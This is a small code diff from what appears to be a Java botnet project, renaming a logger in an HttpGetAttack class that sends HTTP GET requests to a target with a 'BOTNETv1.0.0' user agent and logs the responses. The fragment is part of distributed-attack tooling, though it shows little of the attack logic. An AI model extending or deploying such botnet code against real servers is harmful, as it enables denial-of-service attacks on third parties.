@@ -27,7 +27,7 @@
 package com.acmutv.botnet.attack;
 
 import com.acmutv.botnet.target.HttpTarget;
-import com.acmutv.botnet.tool.LoggerTools;
+import com.acmutv.botnet.service.Logger;
 
 import java.io.IOException;
 import java.net.*;
@@ -56,7 +56,7 @@ public class HttpGetAttack extends HttpAttack {
     http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
     int response = http.getResponseCode();
 
-    LoggerTools.info(String.format("HTTP-ATTACK :: GET %s :: %s", url, response));
+    Logger.info(String.format("HTTP-ATTACK :: GET %s :: %s", url, response));
   }
 
 }
